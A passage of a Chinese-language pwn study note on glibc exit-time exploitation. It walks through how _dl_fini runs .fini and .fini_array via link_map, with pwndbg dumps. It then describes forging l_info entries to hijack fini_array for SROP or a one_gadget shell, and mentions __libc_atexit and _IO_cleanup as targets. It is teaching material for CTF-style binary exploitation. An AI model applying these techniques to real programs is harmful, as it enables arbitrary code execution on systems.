▼</span><br><span class="line">  |                  .fini_array (函数指针数组)</span><br><span class="line">  |                  +--------------------------+</span><br><span class="line">  |                  | fini1()                  |</span><br><span class="line">  |                  | fini2()                  |</span><br><span class="line">  |                  | ...                      |</span><br><span class="line">  |                  +--------------------------+</span><br><span class="line">  ▼                      │</span><br><span class="line">.fini (单个函数)           │</span><br><span class="line">+-----------------+       │</span><br><span class="line">| _fini()         |       │</span><br><span class="line">+-----------------+       │</span><br><span class="line">           │              │</span><br><span class="line">           ▼              ▼</span><br><span class="line">         程序退出时调用 _dl_fini </span><br><span class="line">           │</span><br><span class="line">           ▼</span><br><span class="line">遍历 link_map 链表：</span><br><span class="line">    对每个 l：</span><br><span class="line">        # 调用单个 fini 函数</span><br><span class="line">        if (l-&gt;l_info[DT_FINI] != NULL)</span><br><span class="line">            ((fini_t)(l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr))();</span><br><span class="line">        # 遍历 fini_array</span><br><span class="line">        if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</span><br><span class="line">            ElfW(Addr)* array = (ElfW(Addr)*)(l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">            unsigned int n = l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / sizeof(ElfW(Addr));</span><br><span class="line">            for (i = n-1; i &gt;= 0; i--)</span><br><span class="line">                ((fini_t) array[i])();</span><br><span class="line">           │</span><br><span class="line">           ▼</span><br><span class="line">执行每个 fini 函数 / fini_array 中的函数</span><br></pre></td></tr></table></figure><p>那么<code>call_init</code>遍历<code>.init_array</code>的时候同理，我们看<code>call_init</code>中的关键处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Obtain the main map of the executable.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> GL(dl_ns)[LM_ID_BASE]._ns_loaded;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* DT_PREINIT_ARRAY is not processed here.  It is already handled in</span></span><br><span class="line"><span class="comment">     _dl_init in elf/dl-init.c.  Also see the call_init function in</span></span><br><span class="line"><span class="comment">     the same file.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_INIT] != <span class="literal">NULL</span>)</span><br><span class="line">    DL_CALL_DT_INIT(l, l-&gt;l_addr + l-&gt;l_info[DT_INIT]-&gt;d_un.d_ptr,</span><br><span class="line">    argc, argv, env);</span><br><span class="line"></span><br><span class="line">  ElfW(Dyn) *init_array = l-&gt;l_info[DT_INIT_ARRAY];</span><br><span class="line">  <span class="keyword">if</span> (init_array != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> jm</span><br><span class="line">= l-&gt;l_info[DT_INIT_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span> (ElfW(Addr));</span><br><span class="line">      ElfW(Addr) *addrs = (<span class="type">void</span> *) (init_array-&gt;d_un.d_ptr + l-&gt;l_addr);</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> j = <span class="number">0</span>; j &lt; jm; ++j)</span><br><span class="line">((<span class="type">dl_init_t</span>) addrs[j]) (argc, argv, env);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也是同样方式索引的，最后我们整合出一张示意图（感谢chatgpt）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">_rtld_global (全局动态链接器状态)</span><br><span class="line">┌───────────────────────────────┐</span><br><span class="line">│ head -&gt; link_map 链表          │  &lt;─ 每个节点对应一个库/程序</span><br><span class="line">│ exit_done / lock / hook 等     │</span><br><span class="line">└───────────────────────────────┘</span><br><span class="line">           │</span><br><span class="line">           ▼</span><br><span class="line">+--------------------------+</span><br><span class="line">| link_map (每个库/程序)     |</span><br><span class="line">|--------------------------|</span><br><span class="line">| l_addr   : 基址           |</span><br><span class="line">| l_name   : 库名           |</span><br><span class="line">| l_ld     : .dynamic 指针  |</span><br><span class="line">| l_info[] : 动态段 tag数组  |</span><br><span class="line">| ...                      |</span><br><span class="line">+--------------------------+</span><br><span class="line">           │</span><br><span class="line">   ┌───────┴────────┐</span><br><span class="line">   ▼                ▼</span><br><span class="line">【程序启动】        【程序退出】</span><br><span class="line">  .init / .init_array   .fini / .fini_array</span><br><span class="line">           │                │</span><br><span class="line">           ▼                ▼</span><br><span class="line">l_info[DT_INIT] → 单个 init 函数      l_info[DT_FINI] → 单个 fini 函数</span><br><span class="line">l_info[DT_INIT_ARRAY] → init_array    l_info[DT_FINI_ARRAY] → fini_array</span><br><span class="line">l_info[DT_INIT_ARRAYSZ] → 数量        l_info[DT_FINI_ARRAYSZ] → 数量</span><br><span class="line">           │                │</span><br><span class="line">           ▼                ▼</span><br><span class="line">遍历 init_array              遍历 fini_array</span><br><span class="line">addrs[j] = l_addr +偏移       addrs[i] = l_addr +偏移</span><br><span class="line">for j = 0..N-1:                for i = N-1..0:</span><br><span class="line">    addrs[j](argc,argv,env)       addrs[i]()</span><br><span class="line">           │                │</span><br><span class="line">           ▼                ▼</span><br><span class="line">初始化每个库/程序          清理每个库/程序</span><br></pre></td></tr></table></figure><p>注意这里<code>.init_array</code>是顺序遍历，<code>.fini_array</code>是逆序遍历<br>到这里可仍然疑惑，<code>link_map</code>链表是怎么样的呢，根据实际调试得到以下示意图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">_rtld_global._dl_ns._ns_loaded (链表头) #也可使用_r_debug.r_map获取</span><br><span class="line">       │</span><br><span class="line">       ▼</span><br><span class="line">┌─────────────────────────────────────────┐</span><br><span class="line">│ link_map (主程序 pwn)                    │</span><br><span class="line">│-----------------------------------------│</span><br><span class="line">│ l_addr   → 0x555555554000 (基地址)       │</span><br><span class="line">│ l_name   → 0x7ffff7ffe888 (动态库路径) -&gt;0x0 │</span><br><span class="line">│ l_ld     → 0x555555557dc8 (.dynamic段)  │</span><br><span class="line">│ l_prev   → 0x0 (链表头无前驱)             │</span><br><span class="line">│ l_next   → 0x7ffff7ffe890 (→vdso.so.1)  │</span><br><span class="line">└─────────────────────────────────────────┘</span><br><span class="line">            │</span><br><span class="line">            │ l_next</span><br><span class="line">            ▼</span><br><span class="line">┌─────────────────────────────────────────┐</span><br><span class="line">│ link_map (vdso.so.1)                    │</span><br><span class="line">│-----------------------------------------│</span><br><span class="line">│ l_addr   → 0x7ffff7fc1000               │</span><br><span class="line">│ l_name   → 0x7ffff7fc1371-&gt;&quot;linux-vdso.so.1&quot;│</span><br><span class="line">│ l_ld     → 0x7ffff7fc13e0               │</span><br><span class="line">│ l_prev   → 0x7ffff7ffe2e0 (←pwn)        │</span><br><span class="line">│ l_next   → 0x7ffff7fbb160 (→libc.so.6)  │</span><br><span class="line">└─────────────────────────────────────────┘</span><br><span class="line">            │</span><br><span class="line">            │ l_next</span><br><span class="line">            ▼</span><br><span class="line">┌─────────────────────────────────────────┐</span><br><span class="line">│ link_map (libc.so.6)                    │</span><br><span class="line">│-----------------------------------------│</span><br><span class="line">│ l_addr   → 0x7ffff7c00000               │</span><br><span class="line">│ l_name   → 0x7ffff7fbb140-&gt;&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;│</span><br><span class="line">│ l_ld     → 0x7ffff7e19bc0               │</span><br><span class="line">│ l_prev   → 0x7ffff7ffe890 (←vdso.so.1)  |</span><br><span class="line">│ l_next   → 0x7ffff7ffdaf0 (→ld.so)      │</span><br><span class="line">└─────────────────────────────────────────┘</span><br><span class="line">            │</span><br><span class="line">            │ l_next</span><br><span class="line">            ▼</span><br><span class="line">┌─────────────────────────────────────────┐</span><br><span class="line">│ link_map (ld-linux-x86-64.so.2)         │</span><br><span class="line">│-----------------------------------------│</span><br><span class="line">│ l_addr   → 0x7ffff7fc3000               │</span><br><span class="line">│ l_name   → 0x555555554318-&gt;&quot;/lib64/ld-linux-x86-64.so.2&quot;│</span><br><span class="line">│ l_ld     → 0x7ffff7ffce80               │</span><br><span class="line">│ l_prev   → 0x7ffff7fbb160 (←libc.so.6)  │</span><br><span class="line">│ l_next   → 0x0 (链表尾无后继)             │</span><br><span class="line">└─────────────────────────────────────────┘</span><br></pre></td></tr></table></figure><p>可以看到，<code>l_addr</code>在<code>elf</code>程序本身，<code>libc</code>库，<code>ld</code>链接器就分别对应着<code>elf_base</code>，<code>libc_base</code>，<code>ld_base</code><br>所以我们知道了是如何遍历执行的，那么如果我们能劫持<code>l_info</code>，不就可以劫持程序执行了吗？既然劫持<code>l_info</code>，索引的时候用了几个宏，宏是多少呢？我们找到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT12<span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI13<span class="comment">/* Address of termination function */</span></span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span>DT_INIT_ARRAY25<span class="comment">/* Array with addresses of init fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>DT_FINI_ARRAY26<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>DT_INIT_ARRAYSZ27<span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>DT_FINI_ARRAYSZ28<span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br></pre></td></tr></table></figure><p>我们这里是针对<code>exit</code>的利用，自然是伪造<code>.fini_array</code>或者<code>.fini</code></p><h4 id="fini-array"><a href="#fini-array" class="headerlink" title="fini_array"></a>fini_array</h4><p>我们调试看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _rtld_global</span><br><span class="line">$14 = &#123;</span><br><span class="line">  _dl_ns = &#123;&#123;</span><br><span class="line">      _ns_loaded = 0x7ffff7ffe2e0, #link_map头结点，也就是elf程序本身的link_map结点</span><br><span class="line">      _ns_nloaded = 4, #link_map结点数量</span><br><span class="line">      _ns_main_searchlist = 0x7ffff7ffe5a0,</span><br><span class="line">      _ns_global_scope_alloc = 0,</span><br><span class="line">      _ns_global_scope_pending_adds = 0,</span><br><span class="line">      libc_map = 0x7ffff7fbb160, #libc库对应的link_map结点</span><br><span class="line">      ...</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">   &#125;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p *(struct link_map *) 0x7ffff7ffe2e0</span><br><span class="line">$15 = &#123;</span><br><span class="line">  l_addr = 0x555555554000,</span><br><span class="line">  l_name = 0x7ffff7ffe888 &quot;&quot;,</span><br><span class="line">  l_ld = 0x555555557dc8,</span><br><span class="line">  l_next = 0x7ffff7ffe890,</span><br><span class="line">  l_prev = 0x0,</span><br><span class="line">  l_real = 0x7ffff7ffe2e0,</span><br><span class="line">  l_ns = 0,</span><br><span class="line">  l_libname = 0x7ffff7ffe870,</span><br><span class="line">  l_info = &#123;0x0, 0x555555557dc8, 0x555555557ea8, 0x555555557e98, 0x0, 0x555555557e48, 0x555555557e58, 0x555555557ed8, 0x555555557ee8, 0x555555557ef8, 0x555555557e68, 0x555555557e78, 0x555555557dd8, 0x555555557de8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x555555557eb8, 0x555555557e88, 0x0, 0x555555557ec8, 0x555555557f18, 0x555555557df8, 0x555555557e18, 0x555555557e08, 0x555555557e28, 0x0, 0x555555557f08, 0x0, 0x0, 0x0, 0x0, 0x555555557f38, 0x555555557f28, 0x0, 0x0, 0x555555557f18, 0x0, 0x555555557f58, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x555555557f48, 0x0 &lt;repeats 25 times&gt;, 0x555555557e38&#125;,</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>_rtld_global</code>中第一个<code>_ns_loaded</code>正是<code>link_map</code>的头结点，也就是<code>elf</code>程序的<code>link_map</code>结点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7ffff7ffe2e0+0x40 30</span><br><span class="line">00:0000│  0x7ffff7ffe320 ◂— 0</span><br><span class="line">01:0008│  0x7ffff7ffe328 —▸ 0x555555557dc8 (_DYNAMIC) ◂— 1</span><br><span class="line">02:0010│  0x7ffff7ffe330 —▸ 0x555555557ea8 (_DYNAMIC+224) ◂— 2</span><br><span class="line">03:0018│  0x7ffff7ffe338 —▸ 0x555555557e98 (_DYNAMIC+208) ◂— 3</span><br><span class="line">04:0020│  0x7ffff7ffe340 ◂— 0</span><br><span class="line">05:0028│  0x7ffff7ffe348 —▸ 0x555555557e48 (_DYNAMIC+128) ◂— 5</span><br><span class="line">06:0030│  0x7ffff7ffe350 —▸ 0x555555557e58 (_DYNAMIC+144) ◂— 6</span><br><span class="line">07:0038│  0x7ffff7ffe358 —▸ 0x555555557ed8 (_DYNAMIC+272) ◂— 7</span><br><span class="line">08:0040│  0x7ffff7ffe360 —▸ 0x555555557ee8 (_DYNAMIC+288) ◂— 8</span><br><span class="line">09:0048│  0x7ffff7ffe368 —▸ 0x555555557ef8 (_DYNAMIC+304) ◂— 9 /* &#x27;\t&#x27; */</span><br><span class="line">0a:0050│  0x7ffff7ffe370 —▸ 0x555555557e68 (_DYNAMIC+160) ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">0b:0058│  0x7ffff7ffe378 —▸ 0x555555557e78 (_DYNAMIC+176) ◂— 0xb /* &#x27;\x0b&#x27; */</span><br><span class="line">0c:0060│  0x7ffff7ffe380 —▸ 0x555555557dd8 (_DYNAMIC+16) ◂— 0xc /* &#x27;\x0c&#x27; */</span><br><span class="line">0d:0068│  0x7ffff7ffe388 —▸ 0x555555557de8 (_DYNAMIC+32) ◂— 0xd /* &#x27;\r&#x27; */</span><br><span class="line">0e:0070│  0x7ffff7ffe390 ◂— 0</span><br><span class="line">... ↓     5 skipped</span><br><span class="line">14:00a0│  0x7ffff7ffe3c0 —▸ 0x555555557eb8 (_DYNAMIC+240) ◂— 0x14</span><br><span class="line">15:00a8│  0x7ffff7ffe3c8 —▸ 0x555555557e88 (_DYNAMIC+192) ◂— 0x15</span><br><span class="line">16:00b0│  0x7ffff7ffe3d0 ◂— 0</span><br><span class="line">17:00b8│  0x7ffff7ffe3d8 —▸ 0x555555557ec8 (_DYNAMIC+256) ◂— 0x17</span><br><span class="line">18:00c0│  0x7ffff7ffe3e0 —▸ 0x555555557f18 (_DYNAMIC+336) ◂— 0x6ffffffb</span><br><span class="line">19:00c8│  0x7ffff7ffe3e8 —▸ 0x555555557df8 (_DYNAMIC+48) ◂— 0x19</span><br><span class="line">1a:00d0│  0x7ffff7ffe3f0 —▸ 0x555555557e18 (_DYNAMIC+80) ◂— 0x1a</span><br><span class="line">1b:00d8│  0x7ffff7ffe3f8 —▸ 0x555555557e08 (_DYNAMIC+64) ◂— 0x1b</span><br><span class="line">1c:00e0│  0x7ffff7ffe400 —▸ 0x555555557e28 (_DYNAMIC+96) ◂— 0x1c</span><br><span class="line">1d:00e8│  0x7ffff7ffe408 ◂— 0</span><br></pre></td></tr></table></figure><p>这样找到<code>l_info</code>数组来查看数据，我们定位到0x1a和0x1c处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele  0x555555557e18 2</span><br><span class="line">00:0000│  0x555555557e18 (_DYNAMIC+80) ◂— 0x1a</span><br><span class="line">01:0008│  0x555555557e20 (_DYNAMIC+88) ◂— 0x3dc0</span><br><span class="line">pwndbg&gt; tele  0x555555557e28 2</span><br><span class="line">00:0000│  0x555555557e28 (_DYNAMIC+96) ◂— 0x1c</span><br><span class="line">01:0008│  0x555555557e30 (_DYNAMIC+104) ◂— 8</span><br></pre></td></tr></table></figure><p>这里的<code>0x3dc0</code>正是<code>fini_array</code>的偏移，而<code>8</code>则是对应的<code>fini_array</code>段的大小，单位为<code>byte</code>，我们看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x555555554000+0x3dc0</span><br><span class="line">00:0000│ rcx r14 0x555555557dc0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555100 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">01:0008│         0x555555557dc8 (_DYNAMIC) ◂— 1</span><br><span class="line">02:0010│         0x555555557dd0 (_DYNAMIC+8) ◂— 0x27 /* &quot;&#x27;&quot; */</span><br><span class="line">03:0018│         0x555555557dd8 (_DYNAMIC+16) ◂— 0xc /* &#x27;\x0c&#x27; */</span><br><span class="line">04:0020│         0x555555557de0 (_DYNAMIC+24) ◂— 0x1000</span><br><span class="line">05:0028│         0x555555557de8 (_DYNAMIC+32) ◂— 0xd /* &#x27;\r&#x27; */</span><br><span class="line">06:0030│         0x555555557df0 (_DYNAMIC+40) ◂— 0x115c</span><br><span class="line">07:0038│         0x555555557df8 (_DYNAMIC+48) ◂— 0x19</span><br></pre></td></tr></table></figure><p>的确如此，默认只有一个函数。所以攻击方法也就清晰了<br><code>DT_FINI_ARRAY</code>的值为26，<code>DT_FINI_ARRAYSZ</code>为28，我们修改<code>rtld_global</code>中的<code>l_info[0x1a]</code>为<code>addrA</code>, 修改<code>l_info[0x1c]</code>为<code>addrB</code>，然后布置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addrA: flat(0x1a, addrC)</span><br><span class="line">addrB: flat(0x1c, N)</span><br></pre></td></tr></table></figure><p>也就伪造好了<code>fini_array</code>，在<code>addrC</code>写入函数即可，（我们设置<code>l_addr</code>为<strong>0</strong>），而这里的<code>N</code>就写需要执行的函数数*8即可。<br>既然我们可以控制执行多个函数，那么怎么进行<code>ROP</code>呢？我们分析得知<code>fini_array</code>中多个函数调用之间，只有<code>rdx</code>, <code>r13</code>会被破坏，同时<code>rdi</code>总指向可读写区域<br>我们让<code>fini_array</code>先调用<code>gets()</code>函数, 在<code>rdi</code>中读入<code>SigreturnFrame</code>，然后再调用<code>setcontext+53</code>, 即可进行<code>SROP</code>, 劫持所有寄存器，如果高版本<code>libc</code>, <code>setcontext</code>使用<code>rdx</code>作为参数, 那么在<code>gets(rdi)</code>后还需要一个<code>gadget</code>, 能通过<code>rdi</code>设置<code>rdx</code>，再执行<code>setcontext</code>。同时关于劫持<code>fini_array</code>进行<code>ROP</code>似乎还有另外的手法，贴上博客<br><a href="https://blog.csdn.net/SmalOSnail/article/details/106005946">通过利用fini_array部署并启动ROP攻击 | TaQini_fini.array 地址从哪里获取-CSDN博客</a></p><h4 id="fini"><a href="#fini" class="headerlink" title="fini"></a>fini</h4><p><code>DT_FINI</code>的值为13</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x555555557de8 2</span><br><span class="line">00:0000│  0x555555557de8 (_DYNAMIC+32) ◂— 0xd /* &#x27;\r&#x27; */</span><br><span class="line">01:0008│  0x555555557df0 (_DYNAMIC+40) ◂— 0x115c</span><br><span class="line">pwndbg&gt; disass 0x555555554000+0x115c</span><br><span class="line">Dump of assembler code for function _fini:</span><br><span class="line">   0x000055555555515c &lt;+0&gt;:     endbr64</span><br><span class="line">   0x0000555555555160 &lt;+4&gt;:     sub    rsp,0x8</span><br><span class="line">   0x0000555555555164 &lt;+8&gt;:     add    rsp,0x8</span><br><span class="line">   0x0000555555555168 &lt;+12&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>可以看到本来是执行<code>_fini</code>函数，我们修改<code>rtld_global</code>中<code>l_info[0xd]</code>为<code>addrA</code>, 然后再向<code>addrA</code>中写入函数地址即可，因为只能执行一个函数，所以一般都写<code>one_gadget</code>，但是注意，这要求<strong>程序未开启PIE</strong>，这样<code>l_addr</code>才是<strong>0</strong>，或者我们手动设置<code>l_addr</code>为<strong>0</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addrA: flat(0xd, OGG)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x *(struct link_map *) 0x7ffff7ffe2e0</span><br><span class="line">$2 = &#123;</span><br><span class="line">  l_addr = 0x0,</span><br><span class="line">  l_name = 0x7ffff7ffe888,</span><br><span class="line">  l_ld = 0x403e20,</span><br><span class="line">  l_next = 0x7ffff7ffe890,</span><br><span class="line">  l_prev = 0x0,</span><br><span class="line">  l_real = 0x7ffff7ffe2e0,</span><br><span class="line">  l_ns = 0x0,</span><br><span class="line">  l_libname = 0x7ffff7ffe870,</span><br><span class="line">  l_info = &#123;0x0, 0x403e20, 0x403f00, 0x403ef0, 0x0, 0x403ea0, 0x403eb0, 0x403f30, 0x403f40, 0x403f50, 0x403ec0, 0x403ed0, 0x403e30, 0x403e40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x403f10, 0x403ee0, 0x0, 0x403f20, 0x0, 0x403e50, 0x403e70, 0x403e60, 0x403e80, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x403f70, 0x403f60, 0x0 &lt;repeats 13 times&gt;, 0x403f80, 0x0 &lt;repeats 25 times&gt;, 0x403e90&#125;,</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到关闭pie后，程序的<code>l_addr</code>为<strong>0</strong></p><h2 id="0x05-libc-atexit-IO-cleanup"><a href="#0x05-libc-atexit-IO-cleanup" class="headerlink" title="0x05 __libc_atexit &#x2F; _IO_cleanup"></a>0x05 __libc_atexit &#x2F; _IO_cleanup</h2><p>可以看到<code>exit()</code>的执行流程中存在<code>__libc_atexit</code>这个钩子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br></pre></td></tr></table></figure><p>在<code> __run_exit_handlers</code>的最后，执行这个指针指向的函数，直接修改即可getshell<br>需要注意的是，在<code>glibc2.34+</code>，这个钩子已经<strong>不可写</strong><br>为什么呢，我们注意到在glibc2.35</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text_set_element(__libc_atexit, _IO_cleanup);</span><br></pre></td></tr></table></figure><p>正是因为这里，<code>__libc_atexit</code>已经不可写了，并且默认是<code>_IO_cleanup</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don&#x27;t have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they&#x27;re supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这正是<code>_IO_FILE</code>攻击的一大攻击点</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> exit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
